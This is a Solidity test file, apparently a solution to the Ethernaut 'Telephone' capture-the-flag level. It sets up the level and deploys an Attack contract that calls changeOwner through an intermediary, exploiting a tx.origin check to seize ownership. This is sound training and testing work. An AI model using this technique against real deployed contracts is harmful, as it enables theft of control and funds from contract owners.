// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Telephone.sol";
import "src/levels/TelephoneFactory.sol";

contract TestTelephone is BaseTest {
    Telephone private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new TelephoneFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance(true));
        level = Telephone(levelAddress);

        // Check that the contract is correctly setup
        assertEq(level.owner(), address(levelFactory));
    }

    function exploitLevel() internal override {
        vm.startPrank(player);

        /** CODE YOUR EXPLOIT HERE */
        // https://ethernaut.openzeppelin.com/level/0x0b6F6CE4BCfB70525A31454292017F640C10c768

        emit log_named_address("Current Telephone Owner", level.owner());
        // creating a new contract - to simulate tx.origin attack
        Attack attack = new Attack(level);
        attack.attack();
        emit log_named_address("New Telephone Owner", level.owner());
        emit log_named_address("TX.Origin", address(attack));

        vm.stopPrank();
    }
}

contract Attack {
    Telephone private telephone;

    constructor(Telephone _telephone) public {
        telephone = Telephone(_telephone);
    }

    function attack() public {
        telephone.changeOwner(msg.sender);
    }
}
